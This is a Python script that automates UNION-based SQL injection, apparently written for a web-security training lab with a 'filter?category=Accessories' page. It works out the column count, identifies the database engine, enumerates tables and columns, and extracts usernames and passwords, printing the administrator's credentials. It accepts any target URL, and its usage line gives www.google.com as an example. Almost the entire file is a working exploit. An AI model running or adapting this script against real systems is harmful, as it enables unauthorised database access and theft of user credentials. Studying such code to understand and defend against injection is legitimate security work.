import re
import sys
import urllib.parse

import requests
import urllib3
from colorama import Fore
from bs4 import BeautifulSoup

urllib3.disable_warnings()

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

DB = None
COMMENTS = None
NUMBER_OF_COLUMN = 0
FILTER = "filter?category=Accessories"


# step 1
def find_number_of_columns(base_url):
    global COMMENTS
    global NUMBER_OF_COLUMN
    sql_comments = ["--", "#", "/*", "-- "]
    sql_version = ["Any", "MySQL(1)", "All except ORACLE", "MySQL(2)"]
    comment_index = 0
    for index, comment in enumerate(sql_comments):
        num_of_col = 0
        for i in range(1, 50):
            uri = f"{FILTER}'ORDER BY {i} {comment}"
            print(base_url + uri)
            r = requests.get(base_url + uri, proxies=proxies, verify=False, timeout=5)
            if r.status_code != 200:
                num_of_col = i - 1
                if num_of_col > NUMBER_OF_COLUMN:  # type: ignore
                    NUMBER_OF_COLUMN = num_of_col
                    comment_index = index
                break
    if NUMBER_OF_COLUMN > 0:  # type: ignore
        print(
            f"{Fore.GREEN}[+] Number of columns: {NUMBER_OF_COLUMN}{Fore.RESET}, : {sql_version[comment_index]}"
        )
        COMMENTS = sql_comments[comment_index]


# step 2
def find_sql_version(base_url):
    global DB
    payloads = [
        "banner FROM v$version",
        "version FROM v$instance",
        "@@version",
        "version()",
    ]
    versions = ["ORACLE", "ORACLE", "MSTF OR MySQL", "POSTGRES"]
    print(f"comments: { COMMENTS}")
    for index, payload in enumerate(payloads):
        variation = ["NULL"] * NUMBER_OF_COLUMN
        variation[NUMBER_OF_COLUMN - 1] = payload
        str_variation = ", ".join(variation)
        py = f"' UNION select {str_variation}{COMMENTS}"
        encoded_py = urllib.parse.quote(py)
        # print(base_url + py)
        # print(base_url + encoded_py)
        r = requests.get(
            base_url + FILTER + encoded_py, proxies=proxies, verify=False, timeout=5
        )
        if r.status_code != 200:
            print(f"{Fore.RED}[&] DB is NOT {versions[index]}{Fore.RESET}")
        else:
            DB = versions[index]
            print(f"{Fore.GREEN}[&] DB is {versions[index]}{Fore.RESET}")


# step 3
def exploit_sqli_column_text(base_url, num_of_col):
    found = 0
    payload = "'a'"
    for i in range(num_of_col):
        variation = ["NULL"] * num_of_col
        variation[i] = payload
        str_variation = ", ".join(variation)
        py = f"{FILTER}' UNION select {str_variation}--"
        if DB == "ORACLE":
            py = f"{FILTER}' UNION select {str_variation} FROM dual--"
        # print(base_url + uri + py)
        # encoded_py = urllib.parse.quote(py)
        r = requests.get(base_url + py, proxies=proxies, verify=False, timeout=5)
        if r.status_code != 200:
            print(f"{Fore.RED}[$] Column {i} is NOT of type text{Fore.RESET}")
            continue
        payload_matches = r.text.find(payload[1:-1])
        if payload_matches != -1:
            print(f"{Fore.GREEN}[%] Column {i} is of type text{Fore.RESET}")
            found += 1

    if found:
        return True
    return False


# step 4
def find_tables_name(base_url: str, isOra: bool):
    variation = ["NULL"] * NUMBER_OF_COLUMN
    variation[NUMBER_OF_COLUMN - 1] = "table_name"
    str_variation = ", ".join(variation)
    base_queries = [
        f"{FILTER}' UNION SELECT {str_variation} FROM information_schema.tables --",
        f"{FILTER}' UNION SELECT {str_variation} FROM all_tables --",
    ]
    base_querie = base_queries[1] if isOra else base_queries[0]
    r = requests.get(base_url + base_querie, proxies=proxies, verify=False, timeout=5)

    r.raise_for_status()
    print(base_url + base_querie)
    response_content = r.text
    pattern = r"(?:users|USERS)_\w+"
    matches = re.findall(pattern, response_content)
    for match in matches:
        print(f"{Fore.YELLOW}{match}{Fore.RESET}")

    if len(matches) > 0:
        return True
    return False


def find_columns_name(base_url: str, isOra: bool, table_name: str):
    variation = ["NULL"] * NUMBER_OF_COLUMN
    variation[NUMBER_OF_COLUMN - 1] = "column_name"
    str_variation = ", ".join(variation)
    base_queries = [
        f"{FILTER}' UNION SELECT {str_variation} FROM information_schema.columns WHERE table_name = '{table_name}'--",
        f"{FILTER}' UNION SELECT {str_variation} FROM all_tab_columns WHERE table_name = '{table_name}'--",
    ]
    base_querie = base_queries[1] if isOra else base_queries[0]
    print(base_url + base_querie)
    r = requests.get(base_url + base_querie, proxies=proxies, verify=False, timeout=5)

    r.raise_for_status()
    response_content = r.text
    pattern = r"(?:username|USERNAME|PASSWORD|password)_\w+"
    matches = re.findall(pattern, response_content)
    for match in matches:
        print(f"{Fore.YELLOW}{match}{Fore.RESET}")
    if len(matches) > 0:
        return True
    return False


def find_all_users_password(base_url, isOra, user_col, pass_col, table_name):
    if (NUMBER_OF_COLUMN) < 2:
        return False
    variation = ["NULL"] * NUMBER_OF_COLUMN
    variation[NUMBER_OF_COLUMN - 2] = user_col
    variation[NUMBER_OF_COLUMN - 1] = pass_col
    str_variation = ", ".join(variation)
    base_queries = [
        f"{FILTER}' UNION SELECT {str_variation} FROM {table_name}--",
        f"{FILTER}' UNION SELECT {str_variation} FROM {table_name}--",
    ]
    base_querie = base_queries[1] if isOra else base_queries[0]
    print(base_querie)
    r = requests.get(base_url + base_querie, proxies=proxies, verify=False, timeout=5)

    r.raise_for_status()
    soup = BeautifulSoup(r.text, "html.parser")
    trs = soup.find_all("tr")
    for tr in trs:
        th = tr.find("th", string="administrator")
        if th:
            td = th.find_next("td")
            if td:
                print(f"{Fore.YELLOW}User: {th.text}, Password: {td.text}{Fore.RESET}")

    return False


# general function
def exploit(base_url):
    find_number_of_columns(base_url)
    if NUMBER_OF_COLUMN <= 0:
        print("[-] Exploit failed no columns found")
        sys.exit(0)

    find_sql_version(base_url)
    found = exploit_sqli_column_text(base_url, NUMBER_OF_COLUMN)
    if not found:
        print("No text column found")
        sys.exit(0)
    answer = input("Do you want to look for table names? [y/n]: ")
    if answer == "n":
        sys.exit(0)
    answer = input("Is it an Oracle DataBase? [y/n]: ")
    isOracle = False
    if answer == "y":
        isOracle = True
    found = find_tables_name(base_url, isOracle)
    if not found:
        print("No table found (users_)")
        sys.exit(0)
    tn = input("Please, enter the table_name: ")
    found = find_columns_name(base_url, isOracle, table_name=tn)
    if not found:
        print("No column found (users_)")
        sys.exit(0)
    ucol = input("Please enter username column name: ")
    pcol = input("Please enter password column name: ")
    found = find_all_users_password(base_url, isOracle, ucol, pcol, table_name=tn)
    if not found:
        print("No column found (users_)")
        sys.exit(0)
    return 0


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()

    except IndexError:
        print(f"[-] Usage: {sys.argv[0]} <url>")
        print(f'[-] Example: {sys.argv[0]} www.google.com"')
        sys.exit(-1)

    print("[*] Exploiting...")    
    exploit(url)
